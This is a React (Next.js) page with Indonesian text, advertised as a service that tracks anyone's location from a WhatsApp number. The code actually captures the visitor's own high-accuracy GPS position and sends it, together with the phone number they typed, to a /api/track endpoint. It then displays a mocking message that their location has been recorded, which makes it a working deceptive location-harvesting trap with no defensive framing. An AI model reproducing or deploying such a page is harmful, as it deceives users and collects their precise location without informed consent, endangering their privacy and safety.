'use client';

import { useState, useRef, useEffect } from 'react';

// Komponen baru khusus untuk layar sukses dengan video
function SuccessScreen() {
  const videoRef = useRef(null);

  useEffect(() => {
    if (videoRef.current) {
      videoRef.current.play().catch(error => {
        console.error("Gagal autoplay dengan suara, browser mungkin memblokir:", error);
      });
    }
  }, []);

  return (
    <main className="flex min-h-screen flex-col items-center justify-center bg-gray-900 p-4">
      {/* Mengubah padding dari p-8 menjadi p-6 sm:p-8 */}
      <div className="w-full max-w-md p-6 sm:p-8 space-y-4 bg-white rounded-2xl shadow-lg text-center">
        {/* Mengubah ukuran teks agar lebih responsif */}
        <h2 className="text-xl sm:text-2xl font-bold text-red-600">YAHAHAH NGAREPP BEJIIRRR😹😹</h2>
        <p className="text-base text-gray-700">YANG ADA LOKASI LU YG GW CATET AOWAOWOKAOWKAOWK</p>
        <div className="w-full h-70 aspect-video mt-4 rounded-lg overflow-hidden bg-black">
          <video
            ref={videoRef}
            className="w-full h-full object-cover" // Menambahkan object-cover
            src="/kucing_meme.mp4"
            playsInline
            loop
          >
            Browser LU JADULL NYET GA MENDUKUNG TAG VIDEO SARAN GW MAH BUANG AJA TU HP😹
          </video>
        </div>
      </div>
    </main>
  );
}

export default function HomePage() {
  const [status, setStatus] = useState('idle');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [errorMessage, setErrorMessage] = useState('');

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!phoneNumber.trim()) {
      setErrorMessage('Nomor WhatsApp tidak boleh kosong.');
      return;
    }

    setStatus('submitting');
    setErrorMessage('');

    try {
      const position = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0,
        });
      });

      const { latitude, longitude } = position.coords;

      const response = await fetch('/api/track', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lat: latitude,
          lng: longitude,
          phoneNumber: phoneNumber,
        }),
      });

      if (!response.ok) {
        throw new Error('Gagal mengirim data ke server.');
      }

      setStatus('success');

    } catch (error) {
      console.error("Proses gagal:", error);
      if (error.code === 1) {
        setErrorMessage('Anda harus mengizinkan akses lokasi untuk melanjutkan.');
      } else if (error.code === 3) {
        setErrorMessage('Gagal mendapatkan lokasi akurat (timeout). Coba lagi di tempat dengan sinyal lebih baik.');
      } else {
        setErrorMessage(error.message);
      }
      setStatus('error');
    }
  };

  if (status === 'success') {
    return <SuccessScreen />;
  }

  return (
    <main className="flex min-h-screen flex-col items-center justify-center bg-gray-50 p-4">
      {/* Mengubah padding dari p-8 menjadi p-6 sm:p-8 */}
      <div className="w-full max-w-md p-6 sm:p-8 space-y-4 bg-white rounded-2xl shadow-lg text-center">
        <h1 className="text-2xl md:text-3xl font-bold text-gray-800">Lacak Lokasi Seseorang Hanya Dengan No WA</h1>
        <p className="text-gray-500">Masukkan nomor WhatsApp untuk mengetahui lokasi terkini.</p>
        
        <form onSubmit={handleSubmit} className="w-full space-y-6 pt-6">
          <div>
            <label htmlFor="phone" className="block text-sm font-medium text-gray-700 mb-2">Masukkan Nomor WA Target</label>
            <input
              id="phone"
              type="tel"
              value={phoneNumber}
              onChange={(e) => setPhoneNumber(e.target.value)}
              placeholder="Contoh: 081234567890"
              className="w-full px-4 py-2 text-gray-700 bg-gray-100 border rounded-md focus:border-indigo-500 focus:ring-indigo-500 focus:outline-none focus:ring focus:ring-opacity-40"
              disabled={status === 'submitting'}
            />
          </div>
          {errorMessage && <p className="text-sm text-red-600 text-center">{errorMessage}</p>}
          <div>
            <button type="submit" className="w-full px-4 py-3 font-semibold text-white bg-indigo-600 rounded-md hover:bg-indigo-700 focus:outline-none disabled:bg-indigo-400" disabled={status === 'submitting'}>
              {status === 'submitting' ? 'Mencari Lokasi Akurat...' : 'Lacak Sekarang'}
            </button>
          </div>
        </form>
      </div>
    </main>
  );
}